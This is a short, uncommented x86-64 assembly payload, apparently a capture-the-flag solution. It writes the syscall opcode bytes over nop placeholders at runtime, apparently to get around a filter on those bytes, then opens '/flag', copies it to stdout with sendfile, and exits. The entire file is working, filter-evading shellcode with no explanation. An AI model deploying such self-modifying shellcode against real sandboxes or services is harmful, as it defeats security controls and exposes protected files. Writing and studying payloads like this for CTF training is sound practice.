.global _start
_start:
.intel_syntax noprefix

mov al, 0x0f
mov ah, 0x05
mov [rip+open_syscall+20], al
mov [rip+open_syscall+21], ah
xor rax, rax
call open_syscall

xor rbx, rbx
mov bl, 0x0f
mov bh, 0x05
mov [rip+sendfile_syscall+28], bl
mov [rip+sendfile_syscall+29], bh
call sendfile_syscall

xor rax, rax
mov al, 0x0f
mov ah, 0x05
mov [rip+exit_syscall+5], al
mov [rip+exit_syscall+6], ah
call exit_syscall

open_syscall:
mov rbx, 0x67616c662f
push rbx
mov rdi, rsp
pop rbx
xor rsi, rsi
mov al, 2
nop
nop
ret

sendfile_syscall:
xor rdi, rdi
mov rdi, 1
mov rsi, rax
xor rdx, rdx
mov r10, 1000
xor rax, rax
mov al, 40
nop
nop
ret

exit_syscall:
xor rax, rax
mov al, 60
nop
nop
ret
